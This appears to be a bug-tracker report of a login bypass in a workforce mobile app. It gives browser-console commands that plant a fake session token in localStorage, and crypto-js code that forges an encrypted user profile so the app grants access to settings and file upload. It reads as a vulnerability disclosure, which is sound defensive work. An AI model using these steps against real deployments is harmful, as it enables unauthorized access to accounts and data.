Description.to:
*What*
It is possible to get past the login screen of the mobile app and access other views in the app, despite the user profile data in localstorage being encrypted. An attacker can use a fake session key and get the SHA256 of the key, and then encrypt some profile data object using AES (with the SHA256 of the session key) to generate generate ciphertext that won't crash the application, and will allow unauthorized access.

_Steps to Reproduce_
Open up the Mobile App in a browser and run the following in the console.

{code:java}
localStorage.setItem("fh.wfm.profileData", "");
localStorage.setItem("fh_session_token._index_", '["fh_session_token.sessionToken"]');
localStorage.setItem("fh_session_token.sessionToken", '{"sessionToken":"123"}');
{code}

Change the url to point from `/login` to any of the following, you might need to hit enter twice in the address bar in your browser.
* /settings.
* /files - form here upload a file, check the portal app for the file to see that it got uploaded.

The steps to recreate the encrypted data can be done by visiting https://runkit.com/npm/crypto-js and using the following code:

{code:java}

var CryptoJS = require("crypto-js");
var profile = {"name":"Ann Attacker","username":"aattacker","banner":"https://c1.staticflickr.com/1/360/19373890493_fa1d687ec7_b.jpg","avatar":"https://c1.staticflickr.com/1/360/19373890493_fa1d687ec7_b.jpg","phone":1234567890,"email":"aatacker@example.com","position":"Test","group":"Syl1GdSS","createdTs":1490285927123,"id":"S1kdSubhg"};
    
var sessionToken = CryptoJS.SHA256("123");
console.log(sessionToken.toString(CryptoJS.enc.Base64));
  
var ciphertext = CryptoJS.AES.encrypt(JSON.stringify(profile),sessionToken.toString(CryptoJS.enc.Base64));
console.log(ciphertext.toString());

var bytes  = CryptoJS.AES.decrypt(ciphertext.toString(), sessionToken.toString(CryptoJS.enc.Base64));
var decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
console.log(decryptedData);
{code}

